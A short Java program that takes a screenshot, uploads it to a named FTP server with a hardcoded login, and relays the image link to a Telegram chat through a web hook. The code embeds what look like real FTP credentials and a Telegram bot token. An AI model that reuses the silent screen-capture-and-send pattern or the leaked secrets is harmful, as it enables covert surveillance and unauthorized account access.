import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Date;

public class FtpToTlgrm {
    public static void main(String[] args) throws InterruptedException, IOException {
        File screen = CreateScreen.Create_screen();
        String image = new Date().getTime()+".png";
        FtpSender.SendFile("ftp-srv63801.ht-systems.ru", "srv63801_dash", "Jg7p73H5", screen.getPath(), image);
        String http ="http://srv63801.ht-test.ru/"+image;
        String httprequest ="http://dwar666.herokuapp.com/myhooker.php?token=891657525:AAF-5Mcr9PNhceswBkDGcE_xi5tgVyZOUPY&method=sendPhoto&chat_id=-1001455789174&photo=";
        System.out.println(httprequest);
        String url = httprequest+http;
        URLConnection connection = new URL(url).openConnection();
        connection.setUseCaches(false);
        InputStream is = connection.getInputStream();
        is.close();
    }
}

